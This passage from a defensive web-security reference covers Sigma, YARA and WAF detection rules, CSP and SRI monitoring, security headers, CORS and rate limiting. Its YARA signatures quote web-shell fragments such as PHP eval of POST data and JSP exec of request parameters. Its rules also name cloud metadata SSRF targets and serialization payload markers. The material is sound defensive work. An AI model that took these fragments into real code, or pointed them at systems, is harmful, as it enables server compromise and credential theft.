  selection_cl_te:
    cs_header|contains: 'Transfer-Encoding'
    cs_header|contains: 'Content-Length'
  selection_te_obfuscation:
    cs_header|re: 'Transfer-Encoding\s*:\s*(chunked\s*,|,\s*chunked|x-chunked|chunked\r?\n\s+)'
  condition: selection_duplicate_cl or selection_cl_te or selection_te_obfuscation
level: high
tags:
  - attack.initial_access
  - attack.t1190
```

**SSRF to cloud metadata endpoint:**
```yaml
title: SSRF Attempt to Cloud Metadata Service
id: ea676e8a-7b9c-0d1e-f48a-db4c5d6e7f8a
status: stable
description: Detects outbound requests from application servers to cloud metadata endpoints
logsource:
  category: proxy
  product: any
detection:
  selection:
    dst_ip:
      - '169.254.169.254'
      - 'fd00:ec2::254'
    src_ip|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  selection_dns:
    dns_query|contains:
      - 'metadata.google.internal'
      - 'metadata.azure.com'
  condition: selection or selection_dns
level: critical
tags:
  - attack.credential_access
  - attack.t1552.005
```

**Mass credential stuffing patterns:**
```yaml
title: Credential Stuffing - High Volume Login Failures
id: fb787f9b-8c0d-1e2f-a59b-ec5d6e7f8a9b
status: stable
description: Detects mass login failures indicating credential stuffing attacks
logsource:
  category: application
  product: any
detection:
  selection:
    event_type: 'login_failed'
  condition: selection
  timeframe: 5m
  aggregation:
    count: 50
    group_by: src_ip
level: critical
tags:
  - attack.credential_access
  - attack.t1110.004
```

### 13.2 YARA rules — web shell signatures

```yara
rule ChinaChopper_WebShell {
    meta:
        description = "Detects China Chopper web shell variants"
        author = "Security Library"
        date = "2025-01-15"
        severity = "critical"
        reference = "MITRE ATT&CK T1505.003"

    strings:
        // PHP variants
        $php1 = "<?php @eval($_POST[" ascii nocase
        $php2 = "<?php @assert($_POST[" ascii nocase
        $php3 = "<?php ${'_'.'P'.'O'.'S'.'T'}" ascii  // obfuscated $_POST
        $php4 = /\$\w+=\s*create_function\s*\(\s*['"].*['"],\s*base64_decode/ ascii

        // ASPX variants
        $aspx1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[" ascii
        $aspx2 = "<%@ Page Language=\"C#\"%><%System.Diagnostics.Process" ascii
        $aspx3 = "unsafe{" ascii wide

        // JSP variants
        $jsp1 = "Runtime.getRuntime().exec(request.getParameter" ascii
        $jsp2 = "<%@ page import=\"java.io.*\"%>" ascii

    condition:
        any of them and filesize < 50KB
}

rule PHP_Obfuscated_WebShell {
    meta:
        description = "Detects obfuscated PHP web shells"
        author = "Security Library"
        date = "2025-01-15"
        severity = "high"

    strings:
        $eval_base64 = /eval\s*\(\s*base64_decode\s*\(/ ascii nocase
        $eval_gzinflate = /eval\s*\(\s*gzinflate\s*\(\s*base64_decode/ ascii nocase
        $eval_str_rot13 = /eval\s*\(\s*str_rot13\s*\(/ ascii nocase
        $preg_replace_e = /preg_replace\s*\(\s*['"]\/.*\/e['"]/ ascii  // deprecated /e modifier
        $assert_dynamic = /assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/ ascii nocase
        $hex_payload = /\\x[0-9a-f]{2}\\x[0-9a-f]{2}\\x[0-9a-f]{2}\\x[0-9a-f]{2}/ ascii nocase
        $chr_chain = /chr\(\d+\)\.chr\(\d+\)\.chr\(\d+\)/ ascii

    condition:
        2 of them and filesize < 100KB
}

rule ASPX_WebShell_Generic {
    meta:
        description = "Detects generic ASPX web shells"
        author = "Security Library"
        date = "2025-01-15"
        severity = "critical"

    strings:
        $cmd_exec = "System.Diagnostics.Process" ascii
        $cmd_start = "ProcessStartInfo" ascii
        $file_ops = "System.IO.File" ascii
        $compiler = "CSharpCodeProvider" ascii
        $reflection = "System.Reflection.Assembly.Load" ascii
        $wmi = "System.Management" ascii

    condition:
        (any of ($cmd_exec, $cmd_start)) and filesize < 200KB
        and (uint16(0) == 0x253C or uint16(0) == 0xFEFF)  // starts with <% or BOM
}
```

### 13.3 WAF rule engineering

**ModSecurity CRS tuning — reducing false positives while maintaining coverage:**

```
# Paranoia Level 2 (balanced security/usability)
# /etc/modsecurity/crs-setup.conf
SecAction "id:900000,phase:1,pass,t:none,nolog,\
    setvar:tx.paranoia_level=2"

# Exclude known false positives for specific URLs
# Example: rich text editor endpoint legitimately contains HTML
SecRule REQUEST_URI "@beginsWith /api/content" \
    "id:900100,phase:1,pass,nolog,\
    ctl:ruleRemoveById=941100-941999"
    # Removes XSS detection rules for the content API

# Tighten rules for authentication endpoints
SecRule REQUEST_URI "@beginsWith /api/auth" \
    "id:900101,phase:1,pass,nolog,\
    setvar:tx.paranoia_level=3"
    # Raise paranoia level for auth endpoints

# Custom rule: block GraphQL introspection in production
SecRule REQUEST_BODY "@rx __schema|__type\s*\{" \
    "id:900200,phase:2,block,\
    msg:'GraphQL introspection attempt blocked',\
    severity:'WARNING',tag:'CUSTOM/GRAPHQL'"

# Custom rule: detect deserialization payloads
SecRule REQUEST_BODY "@rx rO0AB|aced0005|O:\d+:" \
    "id:900201,phase:2,block,\
    msg:'Potential deserialization payload detected',\
    severity:'CRITICAL',tag:'CUSTOM/DESERIALIZATION'"
```

**Cloudflare WAF custom rules (wirefilter expressions):**

```
# Block Java serialization payloads
(http.request.body contains "rO0AB") or
(http.request.body contains "aced0005") or
(http.request.headers["content-type"] eq "application/x-java-serialized-object")

# Block SSRF to metadata endpoints
(http.request.uri.query contains "169.254.169.254") or
(http.request.uri.query contains "metadata.google") or
(http.request.body contains "169.254.169.254")

# Block GraphQL introspection
(http.request.body contains "__schema") and
(http.request.uri.path eq "/graphql")
```

### 13.4 Client-side monitoring

**CSP violation reporting analysis.** Extending the CSP reporting infrastructure from §10.2 with operational analysis patterns:

```js
// CSP violation report receiver (Express)
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'] || req.body;

  // Classify the violation
  const classification = classifyViolation(report);

  // High-fidelity indicators:
  if (report['violated-directive']?.startsWith('script-src') &&
      report['blocked-uri']?.match(/^https?:\/\/(?!cdn\.example\.com)/)) {
    // External script blocked — potential XSS attempt or misconfigured CSP
    log.security('CSP_SCRIPT_VIOLATION', {
      document_uri: report['document-uri'],
      blocked_uri: report['blocked-uri'],
      source_file: report['source-file'],
      line_number: report['line-number'],
      client_ip: req.ip,
    });
  }

  res.sendStatus(204);
});
```

**Subresource Integrity failure alerting.** When SRI-protected resources fail integrity checks, the browser blocks the resource and fires an `error` event. Monitor these failures:

```js
// Client-side SRI failure monitoring
document.querySelectorAll('script[integrity], link[integrity]').forEach(el => {
  el.addEventListener('error', (event) => {
    const report = {
      type: 'sri_failure',
      resource: el.src || el.href,
      expected_integrity: el.integrity,
      timestamp: new Date().toISOString(),
      page: location.href,
    };
    navigator.sendBeacon('/security-events', JSON.stringify(report));
  });
});
```

SRI failures may indicate: a compromised CDN, a man-in-the-middle modifying scripts in transit, or a CDN serving a different (possibly vulnerable) version of a library. Each failure warrants investigation.

---

## 14. Web application hardening reference

### 14.1 Content Security Policy — progressive deployment

Deploying CSP on an existing application requires a phased approach to avoid breaking legitimate functionality.

**Phase 1 — Report-Only baseline.**

```http
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com; report-uri /csp-report
```

Deploy in report-only mode for 2–4 weeks. Collect violation reports. Identify all legitimate external resources, inline scripts, and eval usage.

**Phase 2 — Nonce-based scripts.**

Replace `'unsafe-inline'` with per-request nonces. This requires server-side changes to inject a nonce into both the CSP header and each `<script>` tag:

```js
// Express middleware — nonce generation and injection
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  res.setHeader('Content-Security-Policy-Report-Only',
    `default-src 'self'; ` +
    `script-src 'self' 'nonce-${res.locals.cspNonce}' 'strict-dynamic'; ` +
    `style-src 'self' 'unsafe-inline'; ` +
    `object-src 'none'; ` +
    `base-uri 'self'; ` +
    `report-uri /csp-report`
  );
  next();
});

// In template: <script nonce="<%= cspNonce %>">...</script>
```

`'strict-dynamic'` allows scripts loaded by a nonced script to execute without their own nonce. This enables script loaders and dynamically-created scripts without listing every CDN origin.

**Phase 3 — Enforce.**

After confirming zero false positives in report-only mode:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; report-uri /csp-report
```

Maintain `report-uri` even in enforcement mode to monitor for newly-introduced violations.

**Phase 4 — Harden styles.**

If feasible, replace `style-src 'unsafe-inline'` with nonces or hashes. This is harder than scripts because many frameworks inject inline styles dynamically. Evaluate whether the security benefit justifies the implementation cost.

### 14.2 CORS hardening

Extending the Express allowlist implementation from §3.2 with additional hardening:

```js
// Production CORS configuration — comprehensive
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

// Preflight cache: Cache OPTIONS responses to reduce preflight overhead.
// 86400 seconds = 24 hours (Chrome caps at 7200 for credentialed requests)
const PREFLIGHT_MAX_AGE = '7200';

app.use((req, res, next) => {
  const origin = req.headers.origin;

  // Strict allowlist — never reflect arbitrary origins
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');  // Critical: prevents cache poisoning
  }

  if (req.method === 'OPTIONS') {
    // Restrict allowed methods to only those the API uses
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    // Restrict allowed headers to only those the client sends
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
    res.setHeader('Access-Control-Max-Age', PREFLIGHT_MAX_AGE);
    // Do NOT expose sensitive response headers unnecessarily
    // res.setHeader('Access-Control-Expose-Headers', '...');  // Only if needed
    return res.sendStatus(204);
  }

  next();
});
```

**Credential mode risks.** `Access-Control-Allow-Credentials: true` combined with any origin reflection is the highest-impact CORS misconfiguration. With credentials enabled, the browser sends cookies and the attacker can read the response — enabling full authenticated data theft. Never combine credentials with a wildcard (`*`) or reflected origin.

### 14.3 Subresource Integrity deployment guide

SRI ensures that resources fetched from CDNs or third-party origins have not been tampered with. The browser computes a hash of the fetched resource and compares it to the `integrity` attribute:

```html
<!-- Script with SRI -->
<script src="https://cdn.example.com/lib/lodash@4.17.21/lodash.min.js"
        integrity="sha384-OLBgp1GsljhM2TJ+sbHjaiH9txEUvgdDTAzHv2P24donTt6/529l+9Ua0vFImLlb"
        crossorigin="anonymous"></script>

<!-- Stylesheet with SRI -->
<link rel="stylesheet"
      href="https://cdn.example.com/css/normalize@8.0.1/normalize.min.css"
      integrity="sha384-2gFhJ5T7ORVRkxsjnAzdHjF0RQYwLf8DYDL1PqkNgaTWP/X72K0V21r6BQPMHXQ"
      crossorigin="anonymous">
```

**Generating SRI hashes:**

```bash
# Generate SHA-384 hash for a local file
cat lodash.min.js | openssl dgst -sha384 -binary | openssl base64 -A
# Or use shasum:
shasum -b -a 384 lodash.min.js | awk '{print $1}' | xxd -r -p | base64

# Generate from remote URL (verify before trusting)
curl -s https://cdn.example.com/lib/lodash.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

**`crossorigin="anonymous"` is required** for cross-origin resources with SRI. Without it, the browser uses "no-cors" mode and cannot check the integrity of the response body.

**Operational considerations:**
- Pin exact versions of CDN resources (e.g., `lodash@4.17.21`, not `lodash@latest`). SRI hashes are specific to the exact file content.
- Automate SRI hash updates in the build pipeline. Breaking SRI = breaking the page.
- Self-host critical resources when possible to eliminate CDN dependency entirely.

### 14.4 Security headers deployment checklist

Complete header configuration for production web applications, consolidating guidance from §8:

```nginx
# /etc/nginx/conf.d/security-headers.conf
# Include in all server blocks: include /etc/nginx/conf.d/security-headers.conf;

# Transport security — enforce HTTPS, prevent downgrade
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# Content security — prevent XSS and code injection
# Replace {NONCE} with a per-request value generated by the application
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{NONCE}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; report-uri /csp-report" always;

# MIME type enforcement — prevent sniffing attacks
add_header X-Content-Type-Options "nosniff" always;

# Clickjacking prevention — legacy header for older browsers
add_header X-Frame-Options "DENY" always;

# Referrer control — prevent URL leakage
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Feature/permissions restriction
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()" always;

# Cross-origin isolation — Spectre mitigation
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;

# DNS prefetch control — prevent URL leakage to DNS resolver
add_header X-DNS-Prefetch-Control "off" always;

# Prevent legacy plugin cross-domain access
add_header X-Permitted-Cross-Domain-Policies "none" always;
```

**Apache equivalent:**

```apache
# /etc/apache2/conf-available/security-headers.conf
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()"
Header always set Cross-Origin-Opener-Policy "same-origin"
Header always set Cross-Origin-Embedder-Policy "require-corp"
Header always set Cross-Origin-Resource-Policy "same-origin"
Header always set X-DNS-Prefetch-Control "off"
Header always set X-Permitted-Cross-Domain-Policies "none"
```

### 14.5 API security hardening

**Rate limiting strategies:**

| Strategy | Mechanism | Use case |
|----------|-----------|----------|
| Fixed window | Count requests in fixed time intervals (e.g., 100 req/min) | Simple APIs with uniform traffic |
| Sliding window | Count requests in a rolling window relative to each request | Smoother enforcement; prevents burst-at-boundary attacks |
| Token bucket | Tokens accumulate at a steady rate; each request consumes a token | Allows controlled bursts while maintaining average rate |
| Leaky bucket | Requests queue and drain at a fixed rate | Strict rate enforcement; smooths output |

```js
// Express — sliding window rate limiter (redis-based)
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const limiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => new Redis().call(...args),
  }),
  windowMs: 60 * 1000,   // 1 minute
  max: 100,               // 100 requests per window
  standardHeaders: true,   // Return rate limit info in `RateLimit-*` headers
  legacyHeaders: false,
  keyGenerator: (req) => req.ip,  // Per-IP; use req.user?.id for per-user
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests',
      retry_after: res.getHeader('Retry-After'),
    });
  },
});

// Apply stricter limits to auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  keyGenerator: (req) => `${req.ip}:${req.body?.username}`,
  skipSuccessfulRequests: true,
});

app.use('/api/', limiter);
app.use('/api/auth/login', authLimiter);
```

**API key management:**
- Never embed API keys in client-side code (they are extractable from browser DevTools and page source).
- Use short-lived tokens (OAuth access tokens) for client-side API access.
- Server-to-server API keys: store in environment variables or a secrets manager, rotate regularly, scope keys to specific operations/endpoints.
- Log API key usage for audit trails; implement key revocation with immediate effect.

**OAuth scope minimization:**
- Request only the scopes the application actually needs. Avoid requesting `admin` or `write` scopes when `read` suffices.
- Implement incremental authorization: request additional scopes only when the user triggers a feature that needs them.
- Display requested scopes clearly to the user during the consent flow.
- Server-side: enforce scope restrictions per-client registration. A client registered with `read` scope should be rejected if it requests `admin` scope at the authorization endpoint.

---

## 15. Cross-references

**To Domain 2:** Seccomp (Chapter 2B §3) and sandboxing are the server-side equivalents of browser-side origin isolation. The browser's process-per-site architecture (covered in Chapter 8C) uses OS-level isolation (namespaces, seccomp) to enforce origin boundaries.

**To Domain 6:** CSP bypass techniques are the web equivalent of mitigation bypass (Domain 6). The defense-in-depth erosion model (Domain 6 §8) applies: CSP alone is insufficient if the allowlist includes JSONP endpoints; defense requires multiple layers (CSP + Trusted Types + sanitization + output encoding).

**To Chapter 8B:** Server-side attacks (SSRF, injection) can be the means by which an attacker achieves stored XSS (inject malicious content into the database) or steals OAuth tokens (SSRF to the internal authorization server).

**To Domain 9:** WAF rules (§2.8, §10.3) connect to network security monitoring (Domain 9). CSP violation reporting (§10.2) feeds into the same SIEM infrastructure as IDS/IPS alerts.

**To Domain 13:** JWT cryptographic attacks (§4.3) require understanding of asymmetric vs. symmetric signing (Domain 13A), and SAML signature validation (§4.4) depends on XML canonicalization and digital signature standards (Domain 13B).

**To Domain 14:** OAuth and SAML attacks are the web-facing equivalent of Kerberos attacks (Domain 14A). Token theft (OAuth access token) parallels TGT theft (Kerberos). Algorithm confusion parallels Kerberos encryption downgrade attacks.

**To Chapter 8B (from §12):** SSRF (§12.4) and deserialization attacks (§12.5) originate from client-facing inputs but execute server-side. HTTP request smuggling (§12.2) targets the proxy–backend boundary covered in Chapter 8B's server-side attack taxonomy. Web cache poisoning (§12.3) chains client-side and infrastructure layers.

**To Domain 3 (from §11):** Password hashing algorithms (§11.4) use the cryptographic hash functions detailed in Domain 3. Argon2id's memory-hardness property is the password-specific application of the resource-asymmetry principle discussed in Domain 3 §7.

**To Domain 10 (from §13):** YARA web shell signatures (§13.2) integrate with host-based detection (Domain 10). WAF rule engineering (§13.3) and CSP violation monitoring (§13.4) feed the same SIEM pipeline as endpoint detection rules (Domain 10 §4).
